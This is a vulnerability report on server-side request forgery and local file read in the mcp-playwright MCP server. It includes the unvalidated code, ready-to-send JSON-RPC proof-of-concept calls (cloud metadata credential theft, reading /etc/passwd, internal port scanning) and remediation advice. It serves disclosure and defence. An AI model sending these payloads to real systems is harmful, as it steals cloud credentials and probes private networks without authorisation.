# Vulnerability Report: SSRF via Unrestricted URL Navigation (mcp-playwright)

## Summary

| Field | Value |
|---|---|
| **Repository** | [executeautomation/mcp-playwright](https://github.com/executeautomation/mcp-playwright) (5,573 stars) |
| **Vulnerability Type** | SSRF / Local File Read (CWE-918, CWE-200) |
| **CVSS v3.1 Score** | **7.8 (High)** — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` |
| **Affected Files** | `src/tools/browser/navigation.ts`, `src/tools/api/requests.ts` |
| **Suggested Submission** | Bugcrowd |

---

## Vulnerability Details

### Root Cause

Both browser navigation and API request tools accept arbitrary URLs without any validation:

```typescript
// src/tools/browser/navigation.ts
handler: async (args) => {
    await page.goto(args.url);  // No URL validation
}

// src/tools/api/requests.ts
handler: async (args) => {
    const response = await apiContext.get(args.url);  // No validation, body returned
    const body = await response.text();
    return { content: [{ type: 'text', text: body }] };
}
```

The API request tool is especially dangerous — it returns response bodies directly, enabling complete credential exfiltration.

---

## Proof of Concept

### PoC 1: Cloud Metadata Theft via API Tool (Most Dangerous)
```json
{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {
        "name": "api_request",
        "arguments": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "method": "GET"}
    }
}
```
**Result:** Full IAM credentials returned as text.

### PoC 2: Local File Read via Browser
```json
{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {"name": "navigate_page", "arguments": {"url": "file:///etc/passwd"}}
}
```

### PoC 3: Internal Network Scan
```json
[
    {"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"api_request","arguments":{"url":"http://10.0.0.1:22"}}},
    {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"api_request","arguments":{"url":"http://192.168.1.1:8080"}}},
    {"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"api_request","arguments":{"url":"http://192.168.1.100:6379"}}}
]
```

---

## Remediation
1. Block `file://`, `ftp://` schemes
2. Block private IPs and metadata endpoints
3. Apply strict URL validation to both navigation and API tools
4. Add hostname allowlist/denylist

## References
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
